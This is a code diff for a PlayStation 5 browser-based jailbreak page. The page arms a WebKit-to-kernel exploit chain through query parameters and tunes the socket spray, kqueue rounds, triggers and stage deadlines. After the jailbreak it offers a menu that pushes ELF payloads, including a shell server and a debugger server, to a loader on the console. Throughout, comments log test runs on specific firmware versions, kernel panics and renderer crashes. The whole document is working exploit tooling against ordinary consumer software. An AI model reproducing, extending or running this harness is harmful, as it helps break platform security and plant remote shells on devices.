+    if (!grid || grid.getElementsByClassName("payloadTile").length) return;
+    for (var i = 0; i < P2JB_IDLE_PAYLOADS.length; ++i) {
+        var p = P2JB_IDLE_PAYLOADS[i];
+        var a = document.createElement("a");
+        a.className = "payloadTile";
+        a.setAttribute("href", "#");
+        a.tabIndex = 0;
+        a.setAttribute("data-name", p.name);
+        a.setAttribute("data-key", p.key);
+        var img = document.createElement("img");
+        // data-src, not src: showPayloadMenu swaps it in when the menu opens, so tile
+        // artwork is never fetched during the heap groom.
+        img.setAttribute("data-src", "ui/btn-" + p.key + "-default.png");
+        img.setAttribute("alt", "");
+        a.appendChild(img);
+        grid.appendChild(a);
+    }
+})();
+</script>
+
+<!-- Static payload menu, structure and artwork taken from the zecoxao reference
+     (slopkit2/poops.html + slopkit2/ui/*.png). Paths are local: our ui/ sits beside this
+     page, so no "../" prefix. Labels are IMAGES - the dynamically-built text overlay this
+     replaces measured zero-width text (WIN-GEOM t1=0x27) and crashed the WebProcess. -->
+<div id="payloadMenu">
+  <img class="menuTitle" data-src="ui/hdr-payloads.png" alt="">
+  <div class="payloadGrid">
+    <a class="payloadTile" href="#" data-name="etaHEN.elf" data-key="etahen"><img data-src="ui/payload-etahen-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="kstuff.elf" data-key="kstuff"><img data-src="ui/payload-kstuff-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="shadowmountplus.elf" data-key="shadowmountplus"><img data-src="ui/payload-shadowmountplus-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="autoloader.elf" data-key="autoloader"><img data-src="ui/payload-autoloader-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="ftpsrv-ps5.elf" data-key="ftp"><img data-src="ui/payload-ftp-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="pldmgr.elf" data-key="plk"><img data-src="ui/payload-plk-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="gdbsrv-ps5.elf" data-key="gdb"><img data-src="ui/payload-gdb-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="klogsrv-ps5.elf" data-key="klog"><img data-src="ui/payload-klog-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="shsrv-ps5.elf" data-key="shell"><img data-src="ui/payload-shell-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="websrv-ps5.elf" data-key="web"><img data-src="ui/payload-web-default.png" alt=""></a>
+  </div>
+</div>
+<div id="nav"></div>
+<div id="arm" hidden>Open this page with <b>?go=1</b> to arm it. Nothing runs
+otherwise.</div>
+<div id="wrap">
+<table>
+  <thead><tr><th>#</th><th>test</th><th>st</th><th>result</th></tr></thead>
+  <tbody id="rows"></tbody>
+</table>
+</div>
+<div id="tally"></div>
+<div id="summary"></div>
+
+<div id="console" hidden></div>
+
+<!-- CACHE-BUSTERS: bump ?v= on EVERY file you edit. The PS5 browser caches by URL,
+     so an edited file with an unchanged ?v= is simply never re-fetched. poops.js sat
+     at ?v=77 while it was edited, and the console kept running the stale copy - the
+     fix looked applied on disk and was invisible on hardware. rop.js/syscalls.js had
+     NO ?v= at all, which is the same trap with no warning. -->
+<script src="rop.js?v=201"></script>
+<script src="main.js?v=201"></script>
+<script>window.offsetsReady = new Promise(function (res, rej) {
+    var s = document.querySelector('script[src^="offsets/"]');
+    if (!s) return rej(new Error("offsets script was never injected by main.js"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
+    s.addEventListener("load", function () { res(s.src); });
+    s.addEventListener("error", function () {
+        rej(new Error("offsets 404: " + s.src));
+    });
+});
+</script>
+<script src="syscalls.js?v=201"></script>
+
+<script type="module">import { establishPrimitive, fakeCellReleased, CORE_INSTANCE } from "./core.js?v=201";
+import { installWindowP, pairStatus, MEM_SEES_CORE } from "./mem.js?v=201";
+import { int64 } from "./int64.js";
+import { BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList }
+    from "./poops.js?v=201";
+
+// Fail LOUDLY on a module-version split. core.js keeps the entire primitive in
+// module-level `let`s; if this page and mem.js import different core.js URLs they get
+// separate copies, establishPrimitive() fills one and mem.js reads the other, and the
+// only symptom is "pair was NOT promoted / mem: bad numeric address NaN". That cost six
+// runs on retail 12.00 on 2026-08-27, because THIS page had no guard. Keep EVERY module
+// version in lockstep: the page, index.html AND the hardcoded core.js import in mem.js.
+// tools/site_check.py now fails offline when they disagree.
+if (CORE_INSTANCE !== MEM_SEES_CORE) {
+    const msg = "MODULE SPLIT: mem.js imported a different core.js than this page."
+        + " page=" + CORE_INSTANCE.url + "  mem.js=" + MEM_SEES_CORE.url
+        + " -- bump every module version together.";
+    try { window.syncMark && window.syncMark("MODULE-SPLIT", msg); } catch (e) {}
+    throw new Error(msg);
+}
+
+
+let PK = null, makePoopsEngine = null, buildLadder = null;
+
+async function loadPoopsModules() {
+    const lib = await import("./poops.js?v=201");
+
+    await import("./poops.js?v=201");
+    const st = await import("./poops.js?v=201");
+    PK = lib.PK;
+    makePoopsEngine = lib.makePoopsEngine;
+    buildLadder = st.buildLadder;
+    flushMark("POOPS-MODULES-LOADED", "deferred-until-after-primitive");
+}
+
+const Q = new URLSearchParams(location.search);
+const ARMED = Q.get("go") === "1";
+const PAYLOADS_ONLY = Q.get("payloads") === "1";
+const CLEARLATCH = Q.get("clear") === "1";
+// ?force=1 runs the exploit even when this console is marked jailbroken. The marker can
+// only ever be a guess once the browser session has ended (see jbRead below), so there
+// has to be a way to say "no, really, run it".
+const FORCE_RUN = Q.get("force") === "1";
+
+const AUTOCLEAR = Q.get("auto") === "1";
+const FROM = Q.get("from") || "";
+const JB_KEY = "slopkit-poops:jb";        // this browser session jailbroke the console
+const JB_KEY_AT = "slopkit-poops:jb-at";  // durable: WHEN it was jailbroken
+function jbRead() {
+    var session = false, at = null;
+    try { session = sessionStorage.getItem(JB_KEY) === "1"; } catch (e) { }
+    try { at = localStorage.getItem(JB_KEY_AT); } catch (e) { }
+    return { session: session, at: at ? parseInt(at, 10) : 0 };
+}
+const ONLY = (Q.get("only") || "").split(",").map(s => s.trim()).filter(Boolean);
+const FILTERED_RUN = ONLY.length > 0 || FROM !== "";
+const MAX_ATTEMPTS = parseInt(Q.get("max") || "0", 10) || 0;
+const CORE_OVERRIDE = Q.has("core") ? parseInt(Q.get("core"), 10) : -1;
+
+const PROGRESS_KEY = "slopkit-poops:next";
+const RUNLOG_KEY = "slopkit-poops:last";
+const REV = "slopkit-poops-13-stage5-offsets-9to12";
+
+function storeGet(k) {
+    try { return sessionStorage.getItem(k) || ""; } catch { return ""; }
+}
+function storeSet(k, v) { try { sessionStorage.setItem(k, v); } catch { } }
+function storeDel(k) { try { sessionStorage.removeItem(k); } catch { } }
+function storeJson(k) {
+    const raw = storeGet(k);
+    if (!raw) return null;
+    try { return JSON.parse(raw); } catch { return null; }
+}
+const STALLED_AT = storeGet(PROGRESS_KEY);
+const LAST_RUN = storeJson(RUNLOG_KEY);
+
+const TRIGGER = (() => {
+    const t = (Q.get("trigger") || "none").toLowerCase();
+    return (t === "netcontrol" || t === "overflow") ? t : "none";
+})();
+const BURN = (() => {
+    const b = (Q.get("burn") || "probe").toLowerCase();
+    return (b === "none" || b === "full") ? b : "probe";
+})();
+const DEFAULT_ATTEMPTS = TRIGGER === "overflow" ? 96
+    : TRIGGER === "netcontrol" ? 8 : 1;
+
+const cfg = {
+
+    payload: Q.get("payload") || "",
+    trigger: TRIGGER,
+    burn: BURN,
+    netprobe: Q.get("netprobe") === "1",
+    sockets: Math.max(4, Math.min(128,
+        parseInt(Q.get("sockets") || "", 10) || 80)),
+    attempts: Math.max(1, Math.min(512,
+        parseInt(Q.get("attempts") || "", 10) || DEFAULT_ATTEMPTS)),
+    kqBatch: Math.max(1, Math.min(32, parseInt(Q.get("kqbatch") || "", 10) || 8)),
+    kqRounds: Math.max(8, Math.min(50000,
+        parseInt(Q.get("kqrounds") || "", 10) || 5000)),
+    kqConfirm: Q.get("noconfirm") !== "1",
+    burnRounds: Math.max(1, Math.min(100000,
+        parseInt(Q.get("burnrounds") || "", 10) || 20)),
+    burnUnroll: Math.max(1, Math.min(512,
+        parseInt(Q.get("burnunroll") || "", 10) || 512)),
+
+    twinDeadlineMs: 20000,
+    reclaimDeadlineMs: 30000,
+    tripletDeadlineMs: 30000,
+    repairDeadlineMs: 30000,
+    stage0DeadlineMs: Math.max(30000, Math.min(900000,
+        parseInt(Q.get("stage0deadline") || "", 10) || 300000)),
+    stage1DeadlineMs: 120000,
+    stage2Attempts: 5,
+
+    stage2DeadlineMs: Math.max(60000, Math.min(3600000,
+        parseInt(Q.get("stage2deadline") || "", 10) || 900000))
+};
+
+const NAV = Date.now().toString(36);
+let seq = 0;
+let beaconAttempt = 0;
+const teleQueue = [];
+const TELE_QUEUE_CAP = 400;
+let teleDropped = 0;
+const screenLines = [];
+
+const SCREEN_LINES = 22;
+const scrEl = document.getElementById("scr");
+
+const clean = s => String(s).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 200);
+
+function beaconLine(tag, extra) {
+    seq++;
+    return "a" + beaconAttempt + "-r" + NAV + "-s" + seq + "-note-" + tag
+        + (extra !== undefined && extra !== "" ? "-" + clean(extra) : "");
+}
+
+let raceMode = false;
+let screenDirty = false;
+
+const SCREEN_MS = 250;
+let lastPaint = 0;
+
+const CRITICAL_MARKS = { "TRIGGER-ARMED": 1, "LATCH-ESCALATE": 1 };
+function repaintScreen() {
+    if (!screenDirty) return;
+    screenDirty = false;
+    try { scrEl.textContent = screenLines.join("\n"); } catch { }
+}
+function setRaceMode(on) {
+    const was = raceMode;
+    raceMode = !!on;
+    if (was && !raceMode) { repaintScreen(); flushQueue(false); }
+    return was;
+}
+function screenLine(text) {
+    screenLines.push(text.length > 120 ? text.slice(0, 117) + "..." : text);
+    if (screenLines.length > SCREEN_LINES)
+        screenLines.splice(0, screenLines.length - SCREEN_LINES);
+
+    if (raceMode) {
+        screenDirty = true;
+        const nowMs = Date.now();
+        if (nowMs - lastPaint < SCREEN_MS) return;
+        lastPaint = nowMs;
+        screenDirty = false;
+    }
+    try { scrEl.textContent = screenLines.join("\n"); } catch { }
+}
+
+// which marks reach the screen; telemetry keeps everything
+// p2jb's own marks MUST be here or the on-screen log looks dead while it runs.
+const SCREEN_SHOW = /^(STAGE[0-5]|ALLPROC-CHECK|ALIASES-REPAIRED|POOPS-COMPLETE|POOPS-VERDICT|LATCH-HELD|LATCH-READ|OFFSETS-READY|WEBKIT-BASE|MODULE-BASES|SOCKETS|SPAWN|WAKEGATE|p2jb|SYNC-|SP-|SETUP-|IOV-|MEM-HB|LEAK-|PROGRESS|KEXP-|FLAGS)/;
+
+function screenMark(tag, extra) {
+    const s0 = extra == null ? "" : String(extra);
+    let line;
+    if (tag === "TEST") {
+
+        const m = /-why(=|%3D)/.exec(s0);
+        const i = m ? m.index : -1;
+        const head = i < 0 ? s0 : s0.slice(0, i);
+        line = head.replace(/-/, " ");
+        if (i >= 0 && /FAIL/.test(head))
+            line += ": " + s0.slice(i + m[0].length).replace(/_/g, " ");
+    } else if (tag === "TEST-ENTER") {
+
+        line = "> " + s0.replace(/-chainMarks.*$/, "").replace(/-/, " ");
+    } else if (SCREEN_SHOW.test(tag) && !tag.endsWith("-PRE")) {
+        line = s0 ? tag + " " + s0.replace(/_/g, " ") : tag;
+    } else return;
+    if (line.length > 110) line = line.slice(0, 107) + "...";
+    screenLine(line);
+    catState(tag, s0);
+}
+
+function catState(tag, extra) {
+    try {
+        const c = document.getElementById("cat");
+        if (!c) return;
+        if (window.__won) return;   // keep the win screen; ignore cosmetic fails
+        if (tag !== "POOPS-COMPLETE") return;
+        const m = /-fail=(\d+)/.exec(extra || "");
+        const failed = m ? parseInt(m[1], 10) : 1;
+        c.className = failed === 0 ? "ok" : "bad";
+    } catch (e) { }
+}
+
+/* On a real jailbreak, replace poops's red-verdict UI with the win screen:
+ * 1.gif + "Jelbrek Sucsoos". Fires once on the first jailbroken=1/true beacon
+ * (STAGE5/ps10/POOPS-VERDICT all carry it), so the cosmetic ps7 cleanup FAIL
+ * that follows can no longer paint the cat red. */
+// Reuse a gif preloaded (decoded) into the renderer heap BEFORE the exploit.
+// Post-jailbreak the renderer can't reliably fetch+decode a fresh image, so the
+// win/fail gif must already be a live decoded <img> node we just re-parent.
+function winGif(name, styleCss) {
+    let img = document.querySelector('img[data-gif="' + name + '"]');
+    if (!img) { img = document.createElement("img"); img.src = name; }
+    img.removeAttribute("data-gif");
+    img.alt = "";
+    img.style.cssText = styleCss;   // override the hidden preload style -> visible
+    img.addEventListener("error", function () { this.style.display = "none"; });
+    return img;
+}
+
+function showFail() {
+    if (window.__won || window.__failed) return;
+    window.__failed = true;
+    try {
+        if (document.getElementById("failoverlay") || document.getElementById("winoverlay")) return;
+        const ov = document.createElement("div");
+        ov.id = "failoverlay";
+        ov.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;"
+            + "z-index:2147483646;background:#0c0c0f;display:flex;flex-direction:column;"
+            + "align-items:center;justify-content:center;gap:22px;";
+        const img = winGif("3.gif", "width:300px;max-width:70vw;border:0;outline:0;box-shadow:none;background:none;");
+        const t1 = document.createElement("div");
+        t1.textContent = "FAILED";
+        t1.style.cssText = "font-size:68px;font-weight:900;color:#e0483a;letter-spacing:5px;"
+            + "text-shadow:0 0 20px #e0483a;text-align:center;line-height:1.1;";
+        const t2 = document.createElement("div");
+        t2.textContent = "reboot & try again";
+        t2.style.cssText = "font-size:34px;font-weight:800;color:#f6d4d4;letter-spacing:1px;text-align:center;";
+        ov.appendChild(img); ov.appendChild(t1); ov.appendChild(t2);
+        document.body.appendChild(ov);
+    } catch (e) { }
+}
+
+// Adds a "run it anyway" row to the payload overlay. Used when the jailbroken marker is
+// durable-only, i.e. good enough to default to the payload menu but not good enough to
+// take the decision away from the operator.
+function offerRunAnyway(note) {
+    try {
+        const ov = document.getElementById("winoverlay");
+        if (!ov) return;
+        // Same paint rule as the payload tiles: children nested in a wrapper, and anything
+        // carrying a background/border-radius, do not paint on this WebKit even though they
+        // lay out and take clicks. Append both rows straight to the overlay and drop the
+        // pill styling, so this row cannot go invisible the way the tiles did.
+        const n = document.createElement("div");
+        n.textContent = note;
+        n.style.cssText = "flex:0 0 auto;color:#c9a227;font:600 18px/1.4 Arial;"
+            + "margin-top:14px;text-align:center;";
+        const a = document.createElement("a");
+        a.textContent = "Not jailbroken? Run the exploit";
+        a.setAttribute("href", location.pathname + location.search
+            + (location.search ? "&" : "?") + "force=1");
+        a.setAttribute("tabindex", "0");
+        a.style.cssText = "flex:0 0 auto;color:#ffffff;-webkit-text-fill-color:#ffffff;"
+            + "font:800 22px/1.3 Arial;letter-spacing:1px;text-align:center;"
+            + "text-decoration:underline;";
+        ov.appendChild(n); ov.appendChild(a);
+    } catch (e) { }
+}
+
+function showWin() {
+    if (window.__won) return;
+    window.__won = true;
+    try { syncMark("WIN-OVERLAY", "payload menu opening"); } catch (e) { }
+    /* RECORD THE WIN UNDER THE KEYS jbRead() ACTUALLY READS.
+       These used to be written as slopkit-p2jb:* while jbRead() reads JB_KEY /
+       JB_KEY_AT = slopkit-poops:*, so a jailbreak recorded itself where nothing looked.
+       Consequence, hit twice on 2026-08-27: relaunching after a successful jailbreak did
+       NOT take the "already jailbroken this session -> payload menu" shortcut, fell
+       through to the restore guard and dead-ended on "POWER-CYCLE it" - on a console that
+       was jailbroken with elfldr still listening. The durable "jailbroken N min ago"
+       banner never appeared either.
+       That shortcut is also the SAFER branch: it opens the payload menu and never touches
+       the exploit, whereas the guard just refuses. The guard stays for the case where we
+       genuinely do not know. Both spellings are written so an older cached page that still
+       reads the p2jb:* names keeps working. */
+    try { sessionStorage.setItem(JB_KEY, "1"); } catch (e) { }
+    try { localStorage.setItem(JB_KEY_AT, String(Date.now())); } catch (e) { }
+    try { sessionStorage.setItem("slopkit-p2jb:jb", "1"); } catch (e) { }
+    try { localStorage.setItem("slopkit-p2jb:jb-at", String(Date.now())); } catch (e) { }
+    /* HAND THE MENU TO A FRESH PAGE LOAD RATHER THAN BUILDING IT HERE.
+       Measured 2026-08-27 on the 12.70 devkit: the run jailbroke, WIN-MENU-HW arrived and
+       the page went silent. Minutes later the SAME menu, same build, same console opened
+       perfectly from a plain p2jb.html?payloads=1 load - WIN-MENU-SWEEP / -ART / -SHOWN
+       all fired, textPaints=1, and two payloads went out at ok=1. The markup is not the
+       problem; the renderer is. By this point it holds the entire exploit - hundreds of
+       sockets, the spray buffers, the JIT RWX mapping, the kexp thread and a DOM full of
+       run output - and opening a menu in it is the last straw.
+       ?payloads=1 is NOT armed (ARMED is go=1) and PAYLOADS_ONLY returns at the top of the
+       boot path, before the restore guard, straight into wkOnlySender - the exact sequence
+       the working run logged. The kernel-touched latch is deliberately NOT cleared, so the
+       guard still protects the armed path across this navigation. */
+    if (handOffToPayloadsPage()) return;
+    try { showPayloadMenu(); } catch (e) {
+        try { syncMark("WIN-MENU-ERR", String((e && e.message) || e).slice(0, 120)); } catch (e2) { }
+    }
+}
+
+// Navigate to this same page in payloads-only mode. Returns true if the navigation was
+// issued, in which case the caller must not touch the DOM any further.
+function handOffToPayloadsPage() {
+    let url = "";
+    try {
+        /* HANDOFF DISABLED - the menu now opens in this page.
+           Keeping it would undo the whole point: a fresh document has no primitives, so
+           it must rebuild the WebKit heap base, and that rebuild is what dies. It also
+           cannot send at all with this loader - elfldr-ps5-1360.elf takes raw ELF bytes
+           over a socket (it has no ?uri= and no CORS header, verified in the binary), so
+           sending needs the chain that only THIS page still holds.
+           The function is kept, not deleted, so the history and the ?nohandoff=1 escape
+           stay readable - and so re-enabling it is one line if the in-place menu ever
+           regresses. */
+        return false;
+        /* eslint-disable no-unreachable */
+        const q = new URLSearchParams(location.search);
+        if (q.get("nohandoff") === "1") return false;
+        // ALREADY THE FRESH PAGE. wkOnlySender ends at showWin() too, so without this the
+        // payloads page hands off to itself and location.replace()s in a loop - observed
+        // on retail 12.00 at 04:49, WIN-HANDOFF repeating after WK-ONLY-SENDER-ready.
+        if (q.get("payloads") === "1") return false;
+        const v = q.get("v");
+        // Carry the cache-buster across so the fresh load cannot fall back to a stale
+        // cached copy of this page, and so it never needs bumping in two places.
+        // HAND OFF TO THE STANDALONE ELF PAGE, not back into this one.
+        // p2jb.html loads ~830 KB of exploit JS at script-load time; PAYLOADS_ONLY
+        // returns early inside boot(), far too late to avoid the parse and JIT cost.
+        // Measured on retail 12.00 2026-08-27: opening it on an already-jailbroken
+        // console killed the renderer 9 times in 44 loads, always between OFFSETS-READY
+        // and WEBKIT-BASE-HC - it was resolving the WebKit heap base only because
+        // sendElfDirect PUSHES the ELF with mmap + P.write4. elf.html is 7.4 KB, uses
+        // elfldr's HTTP ?uri= pull interface, and needs no primitives at all.
+        // It offers this page's ?payloads=1 sender as its own fallback, so the old path
+        // stays one click away if elfldr's HTTP listener is not up.
+        url = "elf.html" + (v ? "?v=" + encodeURIComponent(v) : "");
+    } catch (e) { return false; }
+    try {
+        // syncMark is synchronous, so this lands before the navigation tears the page down.
+        syncMark("WIN-HANDOFF", "jailbroken - handing the menu to a fresh load: " + url);
+    } catch (e) { }
+    try {
+        /* If the navigation does not take, build the menu in place after all rather than
+           leaving the user on a page that has already declared victory.
+           4s WAS A LAN-ONLY ASSUMPTION. Measured 2026-08-27 06:30 on a console reaching
+           this host over the internet: the server logged
+           `p2jb.html?payloads=1&v=161&from=jb -> 200 (146458 bytes)` and the fallback STILL
+           fired, because the request had completed but the new document had not yet taken
+           over the renderer. So the fallback built the menu inside the very renderer the
+           handoff exists to get out of, while the navigation was still landing.
+           Two guards now: a budget wide enough for a slow link, and cancellation the moment
+           the page actually starts going away. */
+        let fallbackTimer = 0;
+        const cancelFallback = function () {
+            if (fallbackTimer) { clearTimeout(fallbackTimer); fallbackTimer = 0; }
+        };
+        try {
+            window.addEventListener("pagehide", cancelFallback, true);
+            window.addEventListener("beforeunload", cancelFallback, true);
+            window.addEventListener("unload", cancelFallback, true);
+        } catch (e) { }
+        fallbackTimer = setTimeout(function () {
+            fallbackTimer = 0;
+            try { syncMark("WIN-HANDOFF-FALLBACK", "navigation did not take - in-page menu"); }
+            catch (e) { }
+            try { showPayloadMenu(); } catch (e) { }
+        }, 20000);
+        /* Drop the run log first. location.replace() loads the new document in the SAME
+           WebProcess, so for a moment both exist - and on 2026-08-27 a retail 12.00
+           renderer hit the system "not enough free memory" error during exactly this
+           transition (made far worse by the F25 loop stacking 11 reloads). A full run
+           writes thousands of lines into #scr, and it is the biggest thing this page
+           still owns that nothing downstream needs.
+           Deliberately NOT touched: fds, sockets, and every exploit global. Closing a
+           pool fd here would be a crfree on a cred that is already freed. */
+        try {
+            const scr = document.getElementById("scr");
+            if (scr) scr.textContent = "";
+            const early = document.getElementById("early");
+            if (early) early.textContent = "";
+        } catch (e) { }
+        location.replace(url);
+        return true;
+    } catch (e) { return false; }
+}
+
+// Show the static #payloadMenu, the way the zecoxao reference does it.
+//
+// This replaces a dynamically-built full-screen overlay that had two fatal problems on this
+// WebKit, both measured rather than guessed:
+//   * its text rendered with ZERO-ADVANCE glyphs - WIN-GEOM reported the title as t1=0x27
+//     and a stretched payload row as 1508x27, a correct box containing invisible text;
+//   * building it crashed the renderer - App Crash PID=0x55 reason=0x5 (SIGTRAP), with
+//     beacons stopping dead at WIN-OVERLAY and STAGE5-DONE never arriving.
+// The reference avoids both by keeping the menu as STATIC markup toggled with a class, and
+// by using IMAGES for every label. Images have always rendered here; text has not.
+function showPayloadMenu() {
+    /* Prefer the poopsploit-shaped GRID menu; fall back to the original flat strip.
+       Both label their tiles with the same PNGs, so neither depends on text painting -
+       which this WebKit does not do inside this page (2026-08-26: the text grid laid
+       out at 626x128 with 562x40 labels and rendered no glyphs on either console). */
+    const gridMenu = document.getElementById("payloadMenuGrid");
+    const imgMenu = document.getElementById("payloadMenu");
+    /* ?textmenu=1 selects poopsploit's VERBATIM payload view - live text, its own CSS.
+       It is an experiment: the same shape written by hand painted no glyphs on 12.00 and
+       12.70, while poopsploit's own page renders text fine on those consoles, so this
+       tells us whether the difference was the rules or the page. Default stays the
+       rendered-PNG grid, which cannot fail that way. */
+    /* MENU CHOICE, decided by measurement rather than by my guesswork.
+       The glyph probe above ran at page load and knows whether text actually inks in
+       this page. If it does, poopsploit's ported view is used - it is now the same
+       in-flow shape as the menus that survive post-JB (no position:fixed, no z-index
+       layer; promoting a hidden element to a full-screen compositing layer is what
+       killed the renderer at WIN-OVERLAY on 12.00). If it does not, the rendered-PNG
+       grid is used, which needs no glyphs at all.
+       ?textmenu=1 / ?textmenu=0 and ?imgmenu=1 override the probe either way.
+       Anything unexpected leaves poopsView null, i.e. the PNG grid. */
+    let poopsView = null;
+    try {
+        const q = new URLSearchParams(location.search);
+        const forceText = q.get("textmenu");
+        const forceImg = q.get("imgmenu") === "1";
+        const paints = window.__p2jbTextPaints === true;
+        if (!forceImg && (forceText === "1" || (forceText !== "0" && paints)))
+            poopsView = document.getElementById("payloads-view");
+    } catch (e) { poopsView = null; }
+    if (poopsView && !poopsView.getElementsByClassName("payloadTile").length) poopsView = null;
+    const useText = !window.__payloadMenuFallback && (poopsView || gridMenu)
+        && (poopsView || gridMenu).getElementsByClassName("payloadTile").length > 0;
+    const menu = poopsView || (useText ? gridMenu : imgMenu);
+    if (!menu) { syncMark("WIN-MENU-ERR", "no payload menu in document"); return; }
+    /* LEAN MODE on the post-jailbreak load. from=jb means we got here through the handoff,
+       which swaps the DOCUMENT but not the WebProcess - so this page still runs in the
+       renderer that holds the whole exploit. Measured 2026-08-27 on retail 12.00 and devkit
+       12.70: the reveal lands (WIN-MENU-SHOWN) and then the page dies before WIN-MENU, and
+       the WIN-MENU beacon is the first thing after the reveal to force a full layout
+       (offsetHeight/offsetWidth on the grid, then getBoundingClientRect). The same page on a
+       RESPAWNED renderer sails through, so it is memory, not markup.
+       Those reads are diagnostics: the glyph probe already answered textPaints at page load
+       and chose the view, so skipping them here costs a beacon and buys the layout. */
+    /* ALSO LEAN WHEN THE MENU OPENS IN PLACE. ?from=jb only ever existed on the handoff
+       NAVIGATION, and the handoff is gone - the menu is built in the document that ran the
+       exploit. Gating lean on that parameter alone therefore disabled it on the ONE path
+       that needs it most, and left the post-jailbreak menu doing the full layout read the
+       comment above says kills the renderer.
+       Measured 2026-08-28, 12.70 devkit, run rmtclm03w: KEXP-JOIN joinRet=0x0 (elfldr
+       listening), then WIN-MENU-FREED / -SWEEP / -ART / -SHOWN all landed and the page
+       died before WIN-MENU - the identical boundary, and the identical cause, as the
+       handoff era. Every full-chain p2jb run in host-live.log ends at that beacon; the
+       only p2jb runs that ever delivered a payload were ?payloads=1 loads on a console
+       already jailbroken, i.e. a FRESH renderer.
+       showWin() sets __won and is reachable only from a win, so it is the honest test for
+       "this renderer is holding the exploit". A plain ?payloads=1 load leaves it undefined
+       and keeps the diagnostics, which is where they are safe and still worth having. */
+    let lean = false;
+    try {
+        lean = window.__won === true
+            || new URLSearchParams(location.search).get("from") === "jb";
+    } catch (e) { }
+    if (menu === imgMenu) { try { imgMenu.style.display = ""; } catch (e) { } }
+    try {
+        if (menu === gridMenu || menu === poopsView)
+            document.body.classList.add("payload-grid-active");
+        else document.body.classList.remove("payload-grid-active");
+    } catch (e) { }
+    try { navEl.textContent = ""; navEl.style.display = "none"; } catch (e) { }
+    // HIDE THE RUN UI. The menu is normal document flow, so on its own it just renders
+    // BELOW the stage/verdict boxes - which is why the first run with it still showed the
+    // stages page and "ps7 report FAIL" (that FAIL is routine: cleanup is parked by design
+    // after kernel writes, and every successful run reports it). The reference hides its
+    // run UI with body.loader-ready CSS keyed to its own ids (#wrap, #scr, #nav); ours has
+    // a different structure, so hide every body child except the menu instead - that cannot
+    // miss an element we forgot to name.
+    /* RELEASE THE RENDERER, THEN SHOW THE MENU HERE.
+       The menu used to be handed to a fresh document because opening it in this page
+       killed the renderer: by the win this process holds the entire exploit - hundreds
+       of parked sockets, the spray buffers, the JIT RWX mapping, the joined kexp thread
+       AND a DOM holding every line of run output.
+       The fds and threads CANNOT be released: poops.js cleanup() refuses once
+       S.jailbroken, because waking the parked uioW racers after kernel writes panicked a
+       live kernel with "free of already freed object (Files)". That half is untouchable.
+       The DOM half is not. It is pure renderer memory with no kernel involvement, and
+       the sweep below only ever set display:none - which hides the nodes and frees
+       nothing. Emptying and REMOVING them is the difference between a renderer under
+       pressure and one that is not.
+       This is what umtx does: it never navigates after the win. send_buffer_to_port()
+       is raw SYS_SOCKET/SYS_CONNECT/SYS_WRITE on the chain that is already live, so the
+       page that won is the page that sends. Handing off to a fresh document forced that
+       document to rebuild the WebKit heap base from scratch, and THAT is the step that
+       was dying (always between OFFSETS-READY and WEBKIT-BASE-HC, 9 times in 44 loads).
+       Staying here removes the rebuild entirely. */
+    let freed = 0;
+    // Set BEFORE removing anything: the progress ticker fires every second and would
+    // otherwise re-create the banner and repaint #livestat straight back over the menu.
+    try { window.__P2JB_MENU_OPEN = true; } catch (e) { }
+    try {
+        const heavy = ["scr", "early", "rows", "wrap", "summary", "tally", "console",
+                       "livestat", "nokill", "oomnote"];
+        for (let i = 0; i < heavy.length; i++) {
+            const el = document.getElementById(heavy[i]);
+            if (!el) continue;
+            try { el.textContent = ""; } catch (e) { }
+            if (el.parentNode) { el.parentNode.removeChild(el); freed++; }
+        }
+    } catch (e) { }
+    try { syncMark("WIN-MENU-FREED", "run-output nodes removed=" + freed
+        + " - renderer pressure released before opening the menu in place"); } catch (e) { }
+
+    let hidden = 0;
+    try {
+        const kids = document.body.children;
+        for (let i = 0; i < kids.length; i++) {
+            if (kids[i] !== menu && kids[i].tagName !== "SCRIPT") {
+                kids[i].style.display = "none";
+                hidden++;
+            }
+        }
+        document.body.style.display = "block";
+        document.body.style.padding = "16px 0";
+        window.scrollTo(0, 0);
+    } catch (e) { }
+    // BISECT 1/3: the body-wide display:none sweep is done and survived.
+    try { syncMark("WIN-MENU-SWEEP", "hidRunUI=" + hidden + " - body sweep survived"); }
+    catch (e) { }
+    // Images carry data-src and are only fetched when the menu opens, so the exploit's heap
+    // groom is never disturbed by tile artwork loading mid-run.
+    const swap = (el) => {
+        if (el && !el.getAttribute("src") && el.getAttribute("data-src"))
+            el.setAttribute("src", el.getAttribute("data-src"));
+    };
+    swap(menu.getElementsByClassName("menuTitle")[0]);
+    const tiles = menu.getElementsByClassName("payloadTile");
+    for (let i = 0; i < tiles.length; i++) {
+        const a = tiles[i];
+        swap(a.getElementsByTagName("img")[0]);
+        a.onclick = function (ev) {
+            if (ev && ev.preventDefault) ev.preventDefault();
+            sendPayload(a);
+            return false;
+        };
+    }
+    // BISECT 2/3: artwork src assigned and decoded without killing the renderer.
+    try {
+        syncMark("WIN-MENU-ART", "tiles=" + tiles.length + " - data-src swap survived");
+    } catch (e) { }
+    menu.className = "on";
+    // BISECT 3/3: the menu is now VISIBLE. If beacons stop after WIN-MENU-ART but before
+    // this one, the reveal itself is the killer and the fix belongs in how the menu is
+    // shown (F5: a paint change, never a new compositing layer) - not in the artwork.
+    try { syncMark("WIN-MENU-SHOWN", "menu revealed - className=on"); } catch (e) { }
+    if (lean) {
+        try {
+            syncMark("WIN-MENU-LEAN", "post-JB load - skipping the geometry read"
+                + " (tiles=" + tiles.length + " textPaints="
+                + (window.__p2jbTextPaints ? 1 : 0) + ")");
+        } catch (e) { }
+    }
+    if (!lean) try {
+        syncMark("WIN-MENU", "tiles=" + tiles.length
+            + " menuH=" + menu.offsetHeight + "x" + menu.offsetWidth
+            + " tile0=" + (tiles[0] ? tiles[0].offsetWidth + "x" + tiles[0].offsetHeight : "none")
+            + " hidRunUI=" + hidden
